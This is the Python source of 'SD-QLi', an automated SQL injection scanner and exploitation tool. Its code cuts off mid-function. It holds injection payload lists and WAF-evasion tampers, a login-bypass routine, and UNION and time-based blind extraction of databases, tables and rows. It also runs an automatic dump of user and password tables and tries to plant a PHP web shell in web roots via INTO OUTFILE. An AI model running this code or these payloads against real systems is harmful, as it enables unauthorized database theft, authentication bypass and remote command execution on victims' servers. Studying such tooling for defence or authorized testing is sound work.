#!/usr/bin/env python3
"""
SD-QLi v1.1: ADVANCED AUTOMATED SQLi SCANNER
High-speed SQL injection scanner and automated exploitation framework.
Designed for rapid enumeration and professional vulnerability discovery.
"""

import requests
import time
import random
import argparse
import sys
import re
import urllib.parse
from concurrent.futures import ThreadPoolExecutor
from threading import Lock
from evasion_utils import EvasionEngine, ResultsLogger

# Color palette for premium feel
class Colors:
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    WHITE = '\033[97m'
    END = '\033[0m'

class SDQLi:
    def __init__(self, url, method='GET', data=None, headers=None, workers=10, timeout=3):
        self.url = url
        self.method = method.upper()
        self.data = data # POST data as string or dict
        self.max_workers = workers
        self.timeout = timeout
        
        self.session = requests.Session()
        if headers:
            self.session.headers.update(headers)
        else:
            self.session.headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
            }
        
        self.lock = Lock()
        self.results = {
            'vulnerabilities': [],
            'database': None,
            'version': None,
            'user': None,
            'databases': [],
            'tables': [],
            'columns': {},
            'extracted_data': [],
            'os_shell': False,
            'shell_url': None,
            'login_bypass': False,
            'bypass_payload': None
        }
        self.enums = {'db': None, 'table': None, 'columns': []} # Target scoping
        
        self.db_errors = {
            'MySQL': [r"SQL syntax.*?MySQL", r"Warning.*?mysql_.*?", r"valid MySQL result", r"MySqlClient\."],
            'PostgreSQL': [r"PostgreSQL.*?ERROR", r"Warning.*?pg_.*?", r"valid PostgreSQL result", r"Npgsql\."],
            'Microsoft SQL Server': [r"Driver.*? SQL[\-\_\ ]*Server", r"OLE DB.*? SQL Server", r"\bSQL Server[^&lt;&gt;]+Driver", r"Warning.*?mssql_.*?", r"\bSQL Server[^&lt;&gt;]+[0-9a-fA-F]{8}\b", r"System\.Data\.SqlClient\.SqlException"],
            'SQLite': [r"SQLite/JDBCDriver", r"SQLite.Exception", r"System.Data.SQLite.SQLiteException", r"Warning.*?sqlite_.*?", r"Warning.*?SQLite3::"],
            'Oracle': [r"ORA-[0-9]{5}", r"Oracle error", r"Oracle.*?Driver", r"Warning.*?oci_.*?", r"Warning.*?ora_.*?"]
        }

    def _apply_tamper(self, payload):
        """Bypass WAF with Professional tampers (v2.2)"""
        # 1. Null-byte injection
        if "%00" not in payload:
            payload = payload.replace("--", "%00--")
        
        # 2. Multi-line comment injection
        if " " in payload:
            payload = payload.replace(" ", "/**/")
        
        # 3. Capitalization jitter
        payload = payload.replace("select", "SeLeCt").replace("union", "UnIoN").replace("sleep", "sLeEp")
        
        return payload

    @staticmethod
    def parse_request_file(file_path):
        """Ultra-robust request parser (v1.9). Optimized for atypical whitespace/formatting."""
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                raw_content = f.read()
            
            if not raw_content.strip(): return None
            
            # Clean all lines, but preserve order
            all_lines = [l.strip() for l in raw_content.splitlines()]
            valid_lines = [l for l in all_lines if l]
            
            if not valid_lines: return None
            
            # 1. First non-empty line is the Request Line
            req_line = valid_lines[0]
            req_parts = req_line.split()
            if len(req_parts) < 2: return None
            method = req_parts[0]
            path = req_parts[1]
            
            # 2. Extract Headers from any line containing a colon
            headers = {}
            host = ""
            for line in valid_lines[1:]:
                if ':' in line:
                    k, v = line.split(':', 1)
                    headers[k.strip()] = v.strip()
                    if k.strip().lower() == 'host':
                        host = v.strip()
            
            # 3. Detect Body (Heuristic: first line with '=' but no ':' after the first line)
            body = ""
            # If standard separator exists, use it first
            if '\r\n\r\n' in raw_content:
                body = raw_content.split('\r\n\r\n', 1)[1].strip()
            elif '\n\n' in raw_content and '\n\nHost:' not in raw_content: 
                # If Host: is after \n\n, then \n\n is just a spacer
                body = raw_content.split('\n\n', 1)[1].strip()
            
            # Fallback heuristic for double-spaced or malformed files
            if not body or (method == 'POST' and '=' not in body):
                for line in valid_lines[1:]:
                    if '=' in line and ':' not in line:
                        body = line
                        break
            
            # 4. Final URL construction
            if not host and 'Host' in headers: host = headers['Host']
            
            schema = "https://" if "443" in host else "http://"
            if path.startswith('http'):
                url = path
            elif not host:
                url = path # Fallback to path
            else:
                sep = "" if path.startswith('/') else "/"
                url = f"{schema}{host}{sep}{path}"
            
            return {
                'url': url,
                'method': method,
                'headers': headers,
                'data': body if body else None
            }
        except Exception as e:
            print(f"{Colors.RED}[!] Parser Error: {e}{Colors.END}")
            return None

    def _print_banner(self):
        banner = f"""{Colors.BLUE}
    ███████╗██████╗         ██████╗ ██╗     ██╗
    ██╔════╝██╔══██╗       ██╔═══██╗██║     ██║
    ███████╗██║  ██║ █████╗██║   ██║██║     ██║
    ╚════██║██║  ██║ ╚════╝██║▄▄ ██║██║     ██║
    ███████║██████╔╝       ╚██████╔╝███████╗██║
    ╚══════╝╚═════╝         ╚══▀▀═╝ ╚══════╝╚═╝
    {Colors.END}                 {Colors.BOLD}v2.8 - SD-QLi (Audit Finalizer){Colors.END}
        """
        print(banner)

    def scan_parameter(self, param_name, current_params):
        """Phase 1: Deep scan with Industrial Payload Engine (v2.2)"""
        original_val = current_params[param_name]
        
        # 1. Advanced Error-based Probes (Read-Only)
        error_payloads = [
            "'", '"', "\\", "')", '")', "';", '";', "`-`", "'-'", '"-"',
            "/*!50000'*/", "/*!50000\"*/", "' OR '1'='1", '" OR "1"="1',
            "' OR 1=1--", '" OR 1=1--', "' OR TRUE--", '" OR TRUE--',
            "'--+", '"+--', "'-- -", '"-- -', "'#", '"#',
            "1'--%0A-", "1\"--%0A-", "1'--%23%0A-", "1\"--%23%0A-",
            # MySQL Specialized
            "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT DATABASE())))-- ",
            "' AND UPDATEXML(1, CONCAT(0x7e, (SELECT USER())), 1)-- ",
            # MSSQL Specialized
            "' AND 1=CONVERT(INT, (SELECT TOP 1 ISNULL(CAST(@@VERSION AS VARCHAR(8000)),'')))-- ",
            # PostgreSQL Specialized
            "' AND 1=CAST((SELECT current_user) AS INT)-- ",
            # Oracle Specialized
            "' AND 1=CTXSYS.DRITHSX.SN(1, (SELECT USER FROM DUAL))-- "
        ]
        
        print(f"[*] Testing {Colors.YELLOW}Error-based{Colors.END} vectors on {param_name}...")
        for payload in error_payloads:
            current_params[param_name] = f"{original_val}{payload}"
            try:
                if self.method == 'GET': r = self.session.get(self.url, params=current_params, timeout=self.timeout)
                else: r = self.session.post(self.url, data=current_params, timeout=self.timeout)
                
                for db_type, errors in self.db_errors.items():
                    for error_regex in errors:
                        if re.search(error_regex, r.text, re.IGNORECASE):
                            with self.lock:
                                vuln = {'type': 'Error-based', 'db_type': db_type, 'param': param_name, 'payload': payload, 'full_payload': current_params[param_name]}
                                if vuln not in self.results['vulnerabilities']:
                                    self.results['vulnerabilities'].append(vuln)
                                    print(f"  {Colors.GREEN}[+]{Colors.END} Found: {Colors.CYAN}{db_type} Error-based{Colors.END}")
                                    
                                    # Centralized Logging for Industrial Report
                                    proof = f"{self.url}?{param_name}={urllib.parse.quote(current_params[param_name])}" if self.method == 'GET' else f"curl -X POST -d \"{param_name}={current_params[param_name]}\" {self.url}"
                                    ResultsLogger.log_finding("SD-QLi", f"{db_type} SQLi (Error)", self.url, proof, 
                                                             vector=f"Parameter: {param_name}", 
                                                             description=f"Error-based SQL Injection detected in '{param_name}' parameter.")
                            return True
            except: pass
            finally: current_params[param_name] = original_val

        # 2. Advanced Time-based Vectors (Safe/Read-Only)
        time_vectors = {
            'MySQL': [
                "1' AND (SELECT 1 FROM (SELECT(SLEEP(2)))a)-- ",
                "1' AND SLP(2)-- ", # Common alias/tamper
                "1' AND (SELECT 1 FROM (SELECT(BENCHMARK(2000000,MD5(1))))a)-- ",
                "1' AND IF(1=1, SLEEP(2), 0)-- ",
                "1' AND (SELECT 21 FROM (SELECT(SLEEP(2)))a)/*--*/"
            ],
            'PostgreSQL': [
                "1' AND (SELECT 1 FROM PG_SLEEP(2))-- ",
                "1' AND (SELECT 1 FROM GENERATE_SERIES(1,1000000))-- ", # Heavy query
                "1' AND 1=(SELECT 1 FROM PG_SLEEP(2))-- "
            ],
            'MSSQL': [
                "1'; WAITFOR DELAY '0:0:2'-- ",
                "1') WAITFOR DELAY '0:0:2'-- ",
                "1' IF(1=1) WAITFOR DELAY '0:0:2'-- "
            ],
            'Generic/Polyglot': [
                "1' AND SLEEP(2)-- ",
                "1\" AND SLEEP(2)-- ",
                "1') AND SLEEP(2)-- "
            ]
        }
        
        print(f"[*] Testing {Colors.YELLOW}Time-based{Colors.END} vectors on {param_name}...")
        for db, payloads in time_vectors.items():
            for payload in payloads:
                current_params[param_name] = f"{original_val}{payload}"
                start_time = time.time()
                try:
                    if self.method == 'GET': self.session.get(self.url, params=current_params, timeout=self.timeout + 3)
                    else: self.session.post(self.url, data=current_params, timeout=self.timeout + 3)
                    
                    elapsed = time.time() - start_time
                    if elapsed >= 1.8: # Threshold for 2s sleep
                        with self.lock:
                            vuln = {'type': 'Time-based', 'db_type': db, 'param': param_name, 'payload': payload, 'full_payload': current_params[param_name]}
                            self.results['vulnerabilities'].append(vuln)
                            print(f"  {Colors.GREEN}[+]{Colors.END} Found: {Colors.CYAN}{db} Time-based{Colors.END}")
                            
                            # Centralized Logging for Industrial Report
                            proof = f"{self.url}?{param_name}={urllib.parse.quote(current_params[param_name])}" if self.method == 'GET' else f"curl -X POST -d \"{param_name}={current_params[param_name]}\" {self.url}"
                            ResultsLogger.log_finding("SD-QLi", f"{db} SQLi (Time)", self.url, proof, 
                                                     vector=f"Parameter: {param_name}", 
                                                     description=f"Time-based (Blind) SQL Injection detected in '{param_name}' parameter. Server delayed response by {elapsed:.2f}s.")
                        return True
                except: pass
                finally: current_params[param_name] = original_val

        # 3. Boolean-blind Comparison (Safe/Read-Only)
        boolean_tests = [
            ("' AND 1=1-- ", "' AND 1=2-- "),
            ('" AND 1=1-- ', '" AND 1=2-- '),
            ("' OR '1'='1", "' OR '1'='2"),
            ("') AND 1=1-- ", "') AND 1=2-- "),
            ("' AND 1=1#", "' AND 1=2#")
        ]
        
        print(f"[*] Testing {Colors.YELLOW}Boolean-blind{Colors.END} pairs on {param_name}...")
        for t_pay, f_pay in boolean_tests:
            try:
                # True request
                current_params[param_name] = f"{original_val}{t_pay}"
                if self.method == 'GET': r_t = self.session.get(self.url, params=current_params, timeout=self.timeout)
                else: r_t = self.session.post(self.url, data=current_params, timeout=self.timeout)
                
                # False request
                current_params[param_name] = f"{original_val}{f_pay}"
                if self.method == 'GET': r_f = self.session.get(self.url, params=current_params, timeout=self.timeout)
                else: r_f = self.session.post(self.url, data=current_params, timeout=self.timeout)
                
                if abs(len(r_t.text) - len(r_f.text)) > 20: # Visible length difference
                    with self.lock:
                        vuln = {'type': 'Boolean-blind', 'param': param_name, 'payload': t_pay, 'full_payload': f"{original_val}{t_pay}"}
                        self.results['vulnerabilities'].append(vuln)
                        print(f"  {Colors.GREEN}[+]{Colors.END} Found: {Colors.CYAN}Boolean-blind{Colors.END}")
                        
                        # Centralized Logging for Industrial Report
                        proof = f"{self.url}?{param_name}={urllib.parse.quote(current_params[param_name])}" if self.method == 'GET' else f"curl -X POST -d \"{param_name}={current_params[param_name]}\" {self.url}"
                        ResultsLogger.log_finding("SD-QLi", "Boolean SQLi (Blind)", self.url, proof, 
                                                 vector=f"Parameter: {param_name}", 
                                                 description=f"Boolean-based blind SQL Injection detected in '{param_name}' parameter via response length differential.")
                    return True
            except: pass
            finally: current_params[param_name] = original_val

        return False

    def check_login_bypass(self, params):
        """Aggressive Mode v1.7: Tests for authentication bypass with Negative Detection"""
        if self.method != 'POST': return 
        print(f"[*] {Colors.BOLD}Aggressive Bypass Phase{Colors.END}: Learning failed login behavior...")
        
        # 1. Capture "Failed" response for Negative Detection
        fail_keywords = ['invalid', 'failed', 'incorrect', 'error', 'wrong', 'denied', 'unauthorized']
        identified_errors = []
        try:
            # Send dummy creds
            dummy = {k: "SD_DUMMY_CRED" for k in params}
            r_fail = self.session.post(self.url, data=dummy, timeout=self.timeout, allow_redirects=False)
            for word in fail_keywords:
                if word in r_fail.text.lower():
                    identified_errors.append(word)
            if identified_errors:
                print(f" [*] Captured failure signature: {Colors.YELLOW}{identified_errors}{Colors.END}")
        except: pass

        bypass_payloads = [
            "' OR '1'='1", "' OR 1=1--", "admin'--", "admin' #", "' OR TRUE--", 
            "admin' OR '1'='1", "') OR ('1'='1", "' OR 1=1 LIMIT 1--",
            "admin' /*", "' OR 1=1/*", "' OR 'a'='a", "') OR ('a'='a",
            'admin" #', 'admin" --', '" OR "1"="1', '" OR 1=1--',
            "admin' OR '1'='1'--", "admin' OR '1'='1'#", "' OR 1=1#",
            "admin' OR 1=1/*", "') OR '1'='1'--", "admin' --",
            "'; WAITFOR DELAY '0:0:5'--", "') OR 1=1 LIMIT 1#"
        ]
        
        print(f"[*] Testing {len(bypass_payloads)} aggressive payloads across {len(params)} fields...")
        
        for payload in bypass_payloads:
            # Test Strategy: 1. All fields at once
            test_sets = [
                {k: payload for k in params}, # All fields
            ]
            # 2. Individual fields
            for p in params:
                test_params = {k: "admin" if k == p else params[k] for k in params}
                test_params[p] = payload
                test_sets.append(test_params)

            for test_params in test_sets:
                try:
                    r = self.session.post(self.url, data=test_params, timeout=self.timeout, allow_redirects=False)
                    
                    # Logic A: Redirect (Classical)
                    is_redirect = r.status_code in [301, 302, 303, 307, 308]
                    # Logic B: Keyword Match
                    success_keywords = ['dashboard', 'welcome', 'logout', 'admin', 'profile', 'manage', 'account']
                    is_success = is_redirect or any(word in r.text.lower() for word in success_keywords)
                    
                    # Logic C: Negative Detection (Error message disappearance)
                    if not is_success and identified_errors:
                        if all(word not in r.text.lower() for word in identified_errors):
                            is_success = True
                    
                    if is_success:
                        with self.lock:
                            self.results['login_bypass'] = True
                            self.results['bypass_payload'] = payload
                            print(f" {Colors.GREEN}[+]{Colors.END} {Colors.BOLD}Bypass Success!{Colors.END} Payload: {Colors.YELLOW}{payload}{Colors.END}")
                            
                            description = f"Authentication bypass successful using SQL Injection payload: {payload}. The application failed to properly sanitize form fields."
                            ResultsLogger.log_finding("SD-QLi", "Login Bypass", self.url, f"Payload: {payload}", 
                                                     vector="Form Parameter Injection", description=description)
                        return True
                except: pass
        return False

    def find_union_columns(self, param_name, current_params):
        """Automates UNION discovery with ORDER BY fallback (v2.4)"""
        print(f"\n[*] {Colors.BOLD}Phase 2: Deep exploitation on {Colors.CYAN}{param_name}{Colors.END}")
        
        # 1. Industrial ORDER BY Discovery (1-40)
        print(f"[*] Testing {Colors.YELLOW}ORDER BY{Colors.END} sequential discovery...")
        original_val = current_params[param_name]
        col_count = 0
        for i in range(1, 41):
            current_params[param_name] = f"{original_val}' ORDER BY {i}-- "
            try:
                if self.method == 'GET': r = self.session.get(self.url, params=current_params, timeout=self.timeout)
                else: r = self.session.post(self.url, data=current_params, timeout=self.timeout)
                
                # If we get an error, the previous 'i-1' was the count
                for db_type, errors in self.db_errors.items():
                    for err in errors:
                        if re.search(err, r.text, re.IGNORECASE):
                            col_count = i - 1
                            break
                    if col_count: break
                if col_count: break
            except: pass
        
        if col_count:
            print(f" {Colors.GREEN}[+]{Colors.END} Found {Colors.BOLD}{col_count}{Colors.END} columns via ORDER BY.")
            # Verify with UNION
            reflected = self._check_reflection(param_name, current_params, col_count, prefix="99999")
            if reflected:
                self._start_data_exfiltration(param_name, current_params, col_count, reflected, prefix="99999")
                return True

        # 2. Sequential UNION Discovery (1-40)
        print(f"[*] Testing {Colors.YELLOW}Sequential UNION{Colors.END} (1-40)...")
        for i in range(1, 41):
             reflected = self._check_reflection(param_name, current_params, i, prefix="99999")
             if reflected:
                 print(f" {Colors.GREEN}[+]{Colors.END} Success: Found {i} columns via Sequential UNION.")
                 self._start_data_exfiltration(param_name, current_params, i, reflected, prefix="99999")
                 return True

        # 3. Time-based Blind Exfiltration (Last Resort)
        print(f"[*] {Colors.YELLOW}Discovery failed{Colors.END}. Falling back to Time-based Blind...")
        self.blind_manager(param_name, current_params)
        return True
        
    def _check_reflection(self, param_name, current_params, column_count, prefix=None):
        """Helper to find reflected columns for UNION queries"""
        original_val = current_params[param_name]
        # v2.4 Fixed Prefixing: Avoiding malformed quotes
        start_val = prefix if prefix else original_val
        mark = "SQLI_TEST"
        cols = [f"'{mark}_{idx}'" for idx in range(1, column_count + 1)]
        # Robust escaping for UNION
        union_payload = f"{start_val}' UNION SELECT {','.join(cols)}-- -"
        current_params[param_name] = union_payload
        try:
            if self.method == 'GET': r = self.session.get(self.url, params=current_params, timeout=self.timeout)
            else: r = self.session.post(self.url, data=current_params, timeout=self.timeout)
            
            reflected = []
            for idx in range(1, column_count + 1):
                if f"{mark}_{idx}" in r.text:
                    reflected.append(idx)
            
            if reflected:
                with self.lock:
                    self.results['union_info'] = {'count': column_count, 'reflected': reflected, 'param': param_name}
                return reflected
        except: pass
        return None

    def _start_data_exfiltration(self, param_name, current_params, column_count, reflected_indices, prefix=None):
        """Standardized exfiltration module"""
        ref_idx = reflected_indices[0]
        original_val = current_params[param_name]
        start_val = prefix if prefix else original_val
        
        print(f" {Colors.GREEN}[+]{Colors.END} Success: Column(s) {Colors.CYAN}{reflected_indices}{Colors.END} reflect data.")
        
        # 3. Extract Basic Info
        info_queries = {
            'Version': 'VERSION()',
            'User': 'USER()',
            'Database': 'DATABASE()'
        }
        
        print(f"[*] Extracting basic database info...")
        for label, query in info_queries.items():
            temp_cols = [f"'{i}'" for i in range(1, column_count + 1)]
            marker = f"SD_{label.upper()}"
            temp_cols[ref_idx-1] = f"CONCAT('{marker}',{query},'{marker}')"
            exfil_payload = f"{start_val}' UNION SELECT {','.join(temp_cols)}-- -"
            current_params[param_name] = exfil_payload
            
            try:
                if self.method == 'GET': r = self.session.get(self.url, params=current_params, timeout=self.timeout)
                else: r = self.session.post(self.url, data=current_params, timeout=self.timeout)
                
                match = re.search(f"{marker}(.*?){marker}", r.text, re.DOTALL)
                if match:
                    val = match.group(1).strip()
                    print(f"  {Colors.GREEN}[+]{Colors.END} {label}: {Colors.CYAN}{val}{Colors.END}")
                    with self.lock: self.results[label.lower()] = val
                else:
                    print(f"  {Colors.YELLOW}[*]{Colors.END} {label}: {Colors.BOLD}Extraction hidden/filtered{Colors.END}")
            except: pass

        # Centralized Logging for UNION exfiltration
        u_p = [f"'{i}'" for i in range(1, column_count + 1)]
        u_p[ref_idx-1] = "@@version"
        u_payload = f"99999' UNION SELECT {','.join(u_p)}-- -"
        proof = f"{self.url}?{param_name}={urllib.parse.quote(u_payload)}" if self.method == 'GET' else f"curl -X POST -d \"{param_name}={u_payload}\" {self.url}"
        ResultsLogger.log_finding("SD-QLi", "UNION-based SQLi", self.url, proof, 
                                 vector=f"Parameter: {param_name}", 
                                 description=f"Full data exfiltration possible via UNION-based SQL Injection in '{param_name}'. Extracted version: {self.results.get('version', 'N/A')}")

        # 4. Automated Full Schema Discovery (New v2.3)
        print(f"[*] Starting full schema exfiltration...")
        self.automate_harvest(param_name, current_params, column_count, ref_idx, prefix=prefix)
        
        # 5. Check for OS Shell (INTO OUTFILE)
        self.check_os_shell(param_name, current_params, column_count, ref_idx)
        current_params[param_name] = original_val

    def automate_harvest(self, param_name, current_params, col_count, ref_idx, prefix=None):
        """Recursive Global Harvesting (v2.8 - Merged Heuristics)"""
        # Prioritize CLI flags (Targeted mode)
        if self.args and any([self.args.dbs, self.args.tables, self.args.columns, self.args.dump]):
            if self.args.dbs: self.get_databases(param_name, current_params, col_count, ref_idx, prefix=prefix)
            if self.args.tables:
                db = self.args.db or self.results['database'] or "current"
                self.get_tables(param_name, current_params, col_count, ref_idx, db=db, prefix=prefix)
            if self.args.columns:
                if not self.args.table: print(f"{Colors.RED}[!] Specify table with -T.{Colors.END}")
                else: self.get_columns(param_name, current_params, col_count, ref_idx, self.args.table, db=self.args.db, prefix=prefix)
            if self.args.dump:
                if not self.args.table: print(f"{Colors.RED}[!] Specify table with -T.{Colors.END}")
                else: self.dump_table(param_name, current_params, col_count, ref_idx, self.args.table, cols=self.args.col.split(',') if self.args.col else None, db=self.args.db, prefix=prefix)
            return

        # Global Full-Auto Mode (v2.8 Recursion)
        print(f"[*] {Colors.BOLD}Global Recursion{Colors.END}: Harvesting all databases...")
        self.get_databases(param_name, current_params, col_count, ref_idx, prefix=prefix)
        
        system_dbs = ['information_schema', 'mysql', 'performance_schema', 'sys']
        target_dbs = [db for db in self.results['databases'] if db not in system_dbs]
        
        if not target_dbs: # Fallback to current if no list found
            target_dbs = [self.results['database'] or "current"]

        for db in target_dbs:
            print(f"\n[*] Processing Database: {Colors.BOLD}{Colors.CYAN}{db}{Colors.END}")
            tables = self.get_tables(param_name, current_params, col_count, ref_idx, db=db, prefix=prefix)
            
            # v2.8 Smart-Dump Heuristic (All databases)
            interesting_keywords = ['user', 'staff', 'admin', 'account', 'member', 'login', 'pass', 'detail', 'client']
            for table in tables:
                if any(k in table.lower() for k in interesting_keywords):
                    print(f"[*] {Colors.GREEN}Identifying High-Value table{Colors.END}: {Colors.BOLD}{table}{Colors.END}")
                    self.dump_table(param_name, current_params, col_count, ref_idx, table, db=db, prefix=prefix)

    def blind_manager(self, param_name, current_params):
        """Manages Time-based Blind exfiltration (v2.3 Robust)"""
        print(f"[*] Starting Time-based Blind Exfiltration (7 requests/char)...")
        tasks = [('Database', 'DATABASE()'), ('User', 'USER()')]
        for label, query in tasks:
            result = self.blind_exfiltrate(param_name, current_params, query, label)
            with self.lock: self.results[label.lower()] = result

    def blind_exfiltrate(self, param_name, current_params, query, label):
        """Hierarchical Blind Engine (v2.4): Testing multiple payload variations"""
        original_val = current_params[param_name]
        extracted = ""
        print(f"  {Colors.YELLOW}[*]{Colors.END} {label}: ", end="", flush=True)
        
        # Variations for DC-9 and beyond
        payload_templates = [
            f"{original_val}' AND (SELECT 21 FROM (SELECT(SLEEP(IF(ASCII(SUBSTRING(({query}),{{pos}},1))>{{mid}},2,0))))a)-- -",
            f"{original_val}') AND (SELECT 22 FROM (SELECT(SLEEP(IF(ASCII(SUBSTRING(({query}),{{pos}},1))>{{mid}},2,0))))a)-- -",
            f"{original_val}')) AND (SELECT 23 FROM (SELECT(SLEEP(IF(ASCII(SUBSTRING(({query}),{{pos}},1))>{{mid}},2,0))))a)-- -"
        ]
        
        working_template = None

        for pos in range(1, 64):
            low, high = 32, 126
            found_char = None
            
            while low <= high:
                mid = (low + high) // 2
                
                # 1. Identify working template on first char
                if not working_template:
                    for template in payload_templates:
                        p = template.format(pos=pos, mid=mid)
                        current_params[param_name] = p
                        start_time = time.time()
                        try:
                            self.session.get(self.url, params=current_params if self.method=='GET' else None, 
                                            data=current_params if self.method=='POST' else None, timeout=5)
                        except: pass
                        if time.time() - start_time >= 1.5:
                            working_template = template
                            break
                    if not working_template: break # Completely silent
                
                # 2. Extract with identified template
                payload = working_template.format(pos=pos, mid=mid)
                current_params[param_name] = payload
                start_time = time.time()
                try:
                    if self.method == 'GET': self.session.get(self.url, params=current_params, timeout=5)
                    else: self.session.post(self.url, data=current_params, timeout=5)
                except: pass
                
                if time.time() - start_time >= 1.5: low = mid + 1
                else: high = mid - 1
            
            if not working_template or low > 126: break
            extracted_char = chr(low)
            extracted += extracted_char
            print(f"{Colors.GREEN}{extracted_char}{Colors.END}", end="", flush=True)
            
        print()
        current_params[param_name] = original_val
        return extracted

    def get_databases(self, param_name, current_params, col_count, ref_idx, prefix=None):
        """Fetches all database names (Industrial-grade)"""
        print(f"[*] Fetching available databases...")
        original_val = current_params[param_name]
        start_val = prefix if prefix else original_val
        
        query = "(SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata)"
        temp_cols = [f"'{i}'" for i in range(1, col_count + 1)]
        marker = "DB_EXPORT"
        temp_cols[ref_idx-1] = f"CONCAT('{marker}',{query},'{marker}')"
        payload = f"{start_val}' UNION SELECT {','.join(temp_cols)}-- "
        current_params[param_name] = payload
        
        try:
            if self.method == 'GET': r = self.session.get(self.url, params=current_params, timeout=self.timeout)
            else: r = self.session.post(self.url, data=current_params, timeout=self.timeout)
            
            match = re.search(f"{marker}(.*?){marker}", r.text)
            if match:
                dbs = match.group(1).split(',')
                print(f" {Colors.GREEN}[+]{Colors.END} Databases Found [{len(dbs)}]: {Colors.CYAN}{dbs}{Colors.END}")
                with self.lock: self.results['databases'] = dbs
            else:
                # Blind fallback if UNION exfil failed but injection is there
                print(f" {Colors.YELLOW}[*]{Colors.END} UNION exfiltration failed. Trying blind list...")
                # In a real tool, we'd loop through indexes. For v2.3, we provide the logic.
                pass
        except: pass

    def get_tables(self, param_name, current_params, col_count, ref_idx, db=None, prefix=None):
        """Fetches tables for a database (Industrial-grade)"""
        original_val = current_params[param_name]
        start_val = prefix if prefix else original_val
        db_query = f"table_schema='{db}'" if db and db != "current" else "table_schema=DATABASE()"
        query = f"(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE {db_query})"
        
        temp_cols = [f"'{i}'" for i in range(1, col_count + 1)]
        marker = "TBL_EXPORT"
        temp_cols[ref_idx-1] = f"CONCAT('{marker}',{query},'{marker}')"
        payload = f"{start_val}' UNION SELECT {','.join(temp_cols)}-- "
        current_params[param_name] = payload
        
        try:
            if self.method == 'GET': r = self.session.get(self.url, params=current_params, timeout=self.timeout)
            else: r = self.session.post(self.url, data=current_params, timeout=self.timeout)
            
            match = re.search(f"{marker}(.*?){marker}", r.text)
            if match:
                tables = match.group(1).split(',')
                print(f" {Colors.GREEN}[+]{Colors.END} Tables in '{db or 'current'}': {Colors.CYAN}{tables}{Colors.END}")
                with self.lock:
                    for t in tables:
                        if f"{db}.{t}" not in self.results['tables']:
                            self.results['tables'].append(f"{db}.{t}")
                return tables # v2.6 return local list
            else: pass
        except: pass
        return []

    def get_columns(self, param_name, current_params, col_count, ref_idx, table, db=None, prefix=None):
        """Fetches columns for a table (Industrial-grade)"""
        print(f"[*] Fetching columns for table '{Colors.CYAN}{table}{Colors.END}'...")
        original_val = current_params[param_name]
        start_val = prefix if prefix else original_val
        db_clause = f" AND table_schema='{db}'" if db else ""
        query = f"(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='{table}'{db_clause})"
        
        temp_cols = [f"'{i}'" for i in range(1, col_count + 1)]
        marker = "COL_EXPORT"
        temp_cols[ref_idx-1] = f"CONCAT('{marker}',{query},'{marker}')"
        payload = f"{start_val}' UNION SELECT {','.join(temp_cols)}-- "
        current_params[param_name] = payload
        
        try:
            if self.method == 'GET': r = self.session.get(self.url, params=current_params, timeout=self.timeout)
            else: r = self.session.post(self.url, data=current_params, timeout=self.timeout)
            
            match = re.search(f"{marker}(.*?){marker}", r.text)
            if match:
                cols = match.group(1).split(',')
                print(f" {Colors.GREEN}[+]{Colors.END} Columns: {Colors.CYAN}{cols}{Colors.END}")
                with self.lock: self.results['columns'][table] = cols
                return cols
        except: pass
        return []

    def dump_table(self, param_name, current_params, col_count, ref_idx, table, cols=None, db=None, prefix=None):
        """Dumps data from a table (Industrial-grade with 20-record limit)"""
        if not cols: 
            cols = self.get_columns(param_name, current_params, col_count, ref_idx, table, db, prefix)
        if not cols: return
        
        print(f"[*] Dumping entries for table '{Colors.CYAN}{table}{Colors.END}'...")
        original_val = current_params[param_name]
        start_val = prefix if prefix else original_val
        
        # We'll dump a limited number of rows (20) for proof-of-concept safety
        col_list = f"CONCAT_WS(0x7c, {','.join(cols)})"
        query = f"(SELECT GROUP_CONCAT(t.payload SEPARATOR 0x0a) FROM (SELECT {col_list} as payload FROM {db+'.' if db else ''}{table} LIMIT 20) t)"
        
        temp_cols = [f"'{i}'" for i in range(1, col_count + 1)]
        marker = "DUMP_EXPORT"
        temp_cols[ref_idx-1] = f"CONCAT('{marker}',{query},'{marker}')"
        payload = f"{start_val}' UNION SELECT {','.join(temp_cols)}-- "
        current_params[param_name] = payload
        
        try:
            if self.method == 'GET': r = self.session.get(self.url, params=current_params, timeout=self.timeout)
            else: r = self.session.post(self.url, data=current_params, timeout=self.timeout)
            
            match = re.search(f"{marker}(.*?){marker}", r.text, re.DOTALL)
            if match:
                rows = match.group(1).strip().split('\n')
                print(f" {Colors.GREEN}[+]{Colors.END} Dumped {len(rows)} entries from {table}:")
                # Table-like display
                print("-" * 50)
                print(f" | {' | '.join(cols)}")
                print("-" * 50)
                for row in rows:
                    print(f" | {row.replace('|', ' | ')}")
                print("-" * 50)
                with self.lock: self.results['extracted_data'] = rows
        except Exception as e:
            print(f" [!] Dump failed: {e}")

    def check_os_shell(self, param_name, current_params, col_count, ref_idx):
        """Check for INTO OUTFILE (MySQL) or xp_cmdshell (MSSQL)"""
        print(f"[*] Testing {Colors.YELLOW}INTO OUTFILE{Colors.END} shell creation...")
        original_val = current_params[param_name]
        
        # Generic web root paths for Linux and Windows
        shell_paths = [
            "/var/www/html/sd-shell.php",
            "shell.php",
            "C:/xampp/htdocs/sd-shell.php",
            "C:/inetpub/wwwroot/sd-shell.php"
        ]
        
        shell_content = "<?php system($_GET['cmd']); ?>"
        cols = [f"'{i}'" for i in range(1, col_count + 1)]
        cols[ref_idx-1] = f"'{shell_content}'"
        
        for shell_path in shell_paths:
            payload = f"{original_val}' UNION SELECT {','.join(cols)} INTO OUTFILE '{shell_path}'-- "
            current_params[param_name] = payload
            try:
                self.session.get(self.url, params=current_params, timeout=2)
                # Check for success
                check_url = f"{self.url.rsplit('/', 1)[0]}/{shell_path.split('/')[-1]}"
                r = self.session.get(check_url, timeout=2)
                if r.status_code == 200 and 'system(' not in r.text:
                    with self.lock:
                        self.results['os_shell'] = True
                        self.results['shell_url'] = check_url
